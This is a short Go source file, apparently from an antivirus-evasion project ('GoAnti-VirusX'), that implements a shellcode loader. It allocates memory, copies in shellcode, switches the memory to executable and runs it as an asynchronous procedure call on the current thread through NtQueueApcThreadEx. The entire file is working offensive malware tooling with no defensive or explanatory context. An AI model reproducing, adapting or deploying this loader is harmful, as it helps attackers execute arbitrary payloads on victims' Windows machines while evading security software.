package Loader

import (
	"GoAnti-VirusX/API"
	"golang.org/x/sys/windows"
	"unsafe"
)

func NtQueueApcThreadExLoader(shellcode []byte) {
	api, _ := API.SetWindowsAPI()

	addr, _, err := api.VirtualAlloc().Call(0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if addr == 0 {
		panic(err)
	}
	_, _, _ = api.RtlCopyMemory().Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	oldProtect := windows.PAGE_READWRITE
	_, _, _ = api.VirtualProtect().Call(addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))

	thread, _, _ := api.GetCurrentThread().Call()
	_, _, _ = api.NtQueueApcThreadEx().Call(thread, 1, addr, 0, 0, 0)
}
